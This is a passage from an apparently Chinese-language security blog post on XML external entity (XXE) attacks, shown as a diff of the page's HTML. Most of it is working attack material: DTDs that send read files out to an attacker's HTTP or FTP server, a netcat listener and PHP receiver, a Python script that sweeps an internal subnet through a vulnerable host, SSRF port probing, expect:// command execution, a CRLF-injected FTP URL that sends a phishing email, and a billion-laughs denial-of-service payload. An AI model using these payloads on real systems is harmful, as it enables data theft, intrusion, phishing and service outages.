class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="无回显型"><a href="#无回显型" class="headerlink" title="无回显型"></a>无回显型</h3><p>在java中没有编码的协议，如php能使用base64外带</p>
+<p><strong>php解决情况：</strong></p>
+<p>接收外带访问的数据</p>
+<p>test.dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用nc来接收参数</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvv <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+<p>或者是写一个接收的php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ipd</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] : <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ipd</span>)&#123;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$t</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP&gt;REFERER&#x27;</span>];<br>    <span class="hljs-variable">$txt</span> = htmlspecialchars(<span class="hljs-variable">$ipd</span>.<span class="hljs-string">&quot;--&quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;--&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;--&quot;</span>.<span class="hljs-variable">$t</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br>    <span class="hljs-variable">$n</span> = fopen(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-comment">#  $x = fwrite($n,$txt);    </span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发送</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">pe3</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://x.x.x.x/test.dtd&quot;</span>&gt;</span> </span><br><span class="hljs-meta">%pe3;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">aa</span>&gt;</span>&amp;ge1;<span class="hljs-tag">&lt;/<span class="hljs-name">aa</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p><strong>java解决情况：</strong></p>
+<p>可以看到直接爆出非法字符一些情况</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220406155907.png"></p>
+<p>由于java没有相关的编码协议，我们可以考虑使用ftp协议外带数据</p>
+<p> jdk版本小于7u141和小于8u162才可以读取整个文件</p>
+</br>
+
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">xd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://192.168.3.20:8000/1.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %xd;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>aaaa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>1.dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">aaaa</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">demo</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY bbbb SYSTEM &#x27;ftp://192.168.3.199:2121/%aaaa;&#x27;&gt;&quot;</span>&gt;</span><br>%demo;<br></code></pre></td></tr></table></figure>
+
+<p>搭建http</p>
+<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta">python3 -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure>
+
+<p>搭建ftp</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></p>
+<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta">ruby xxe-ftp-<span class="hljs-keyword">server</span>.rb<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a>HTTP 内网主机探测</h3><p>存在 XXE 漏洞的服务器为我们探测内网的支点</p>
+<p>首先是php站点</p>
+<p>准备工作</p>
+<ul>
+<li>先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子</li>
+<li>可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#Origtional XML that the server accepts</span><br><span class="hljs-comment">#&lt;xml&gt;</span><br><span class="hljs-comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="hljs-comment">#&lt;/xml&gt;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_xml</span>(<span class="hljs-params">string</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>    send_xml(xml)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_xml</span>(<span class="hljs-params">xml</span>):</span><br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    x = requests.post(<span class="hljs-string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>    coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>] <span class="hljs-comment"># a little split to get only the base64 encoded value</span><br>    <span class="hljs-built_in">print</span> coded_string<br><span class="hljs-comment">#   print base64.b64decode(coded_string)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">try</span>:<br>        i = <span class="hljs-built_in">str</span>(i)<br>        ip = <span class="hljs-string">&#x27;10.0.0.&#x27;</span> + i<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        <span class="hljs-built_in">print</span> string<br>        build_xml(string)<br>    <span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="内网主机端口扫描"><a href="#内网主机端口扫描" class="headerlink" title="内网主机端口扫描"></a>内网主机端口扫描</h3><p>可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF<br>以下代码将尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启</p>
+<p>可以将请求的端口作为 参数 然后利用 burp 的 intruder 来帮我们探测</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">GVI</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://127.0.0.1:8080&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>John, Doe<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>I love XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">category</span>&gt;</span>Computers<span class="hljs-tag">&lt;/<span class="hljs-name">category</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>2020-11-11<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="远程代码执行（RCE）"><a href="#远程代码执行（RCE）" class="headerlink" title="远程代码执行（RCE）"></a>远程代码执行（RCE）</h3><p>PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上<br>就可以执行如下的命令：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>John, Doe<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>I love XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">category</span>&gt;</span>Computers<span class="hljs-tag">&lt;/<span class="hljs-name">category</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>2020-11-11<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼</p>
+<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
+<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span>://a%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AEHLO%<span class="hljs-number">20</span>a%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AMAIL%<span class="hljs-number">20</span>FROM%<span class="hljs-number">3</span>A%<span class="hljs-number">3</span>Csupport%<span class="hljs-number">40</span>VULNERABLESYSTEM.com%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ARCPT%<span class="hljs-number">20</span>TO%<span class="hljs-number">3</span>A%<span class="hljs-number">3</span>Cvictim%<span class="hljs-number">40</span>gmail.com%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ADATA%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AFrom%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>support%<span class="hljs-number">40</span>VULNERABLESYSTEM.com%<span class="hljs-number">0</span>ATo%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>victim%<span class="hljs-number">40</span>gmail.com%<span class="hljs-number">0</span>ASubject%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>test%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>Atest!%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A.%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AQUIT%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A:a@VULNERABLESYSTEM.com:<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure>
+
+<p>格式化URL解码后</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">ftp:<span class="hljs-comment">//a</span><br>EHLO a<br>MAIL FROM: &lt;support@<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VULNERABLESYSTEM</span>.</span></span>com&gt;<br>RCPT TO: &lt;victim@gmail.com&gt;<br>DATA<br>From: support@<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VULNERABLESYSTEM</span>.</span></span>com<br>To: victim@gmail.com<br>Subject: Reset your password<br>We need <span class="hljs-keyword">to</span> confirm your identity. Confirm your password here: http:<span class="hljs-comment">//PHISHING_URL.com</span><br>.<br>QUIT<br>:support@<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VULNERABLESYSTEM</span>.</span></span>com:<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure>
+
+<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
+</br>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><strong>jar:// 协议的格式：</strong></p>
+<figure class="highlight dust"><table><tr><td class="code"><pre><code class="hljs dust"><span class="xml">jar:</span><span class="hljs-template-variable">&#123;url&#125;</span><span class="xml">!</span><span class="hljs-template-variable">&#123;path&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">jar:http:<span class="hljs-regexp">//</span>host<span class="hljs-regexp">/application.jar!/</span>file<span class="hljs-regexp">/within/</span>the/zip<br><span class="hljs-regexp">//</span>这个 ! 后面就是其需要从中解压出的文件<br></code></pre></td></tr></table></figure>
+
+<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的</p>
+</br>
+
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
+</br>
+
+<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
+<p>因为在 java中file:///协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;jar:http://localhost:9999/jar.zip!/wm.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br>     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">lolz</span> [</span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol</span> <span class="hljs-meta-string">&quot;lol&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol2</span> <span class="hljs-meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol3</span> <span class="hljs-meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol4</span> <span class="hljs-meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol5</span> <span class="hljs-meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol6</span> <span class="hljs-meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol7</span> <span class="hljs-meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol8</span> <span class="hljs-meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">lol9</span> <span class="hljs-meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span><br><span class="hljs-meta">     ]&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h2 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h2><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">javax.xml.parsers.DocumentBuilderFactory;<br>javax.xml.parsers.SAXParser<br>javax.xml.transform.TransformerFactory<br>javax.xml.validation.Validator<br>javax.xml.validation.SchemaFactory<br>javax.xml.transform.sax.SAXTransformerFactory<br>javax.xml.transform.sax.SAXSource<br>org.xml.sax.XMLReader<br>org.xml.sax.helpers.XMLReaderFactory<br>org.dom4j.io.SAXReader<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XpathExpression<br>javax.xml.stream.XMLStreamReader<br>org.apache.commons.digester3.Digester<br>.......<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+</div>
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 109;
+        width: 600px !important;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            width: 88%
+        }
+    }
+</style>
+<script>
+    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
+</script>
+<div class="Last-Next">
+    
+    <a href="/2022/04/07/SSRF%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%BB%83/">
+        <div class="last">
+            <span>上一篇</span>
+            <p>SSRF从外网到内网靶场演练</p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2022/04/03/SpringCloud%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">
+        <div class="next">
+            <span>下一篇</span>
+            <p>SpringCloud代码审计思路分析</p>
+        </div>
+    </a>
+    
+</div>
+		
+<link rel="stylesheet" href="/css/food.css">
+
+<div class="footer">
+	<div class="Copyright">
+		©2022 By TRRQ. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: block;
+            border-radius: 50%;
+            width: 66px;
+            height: 66px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            transition: border .5s;
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 30px;
+            height: 30px;
+            margin-top: 17.5px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
+</script>
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+
+</html>
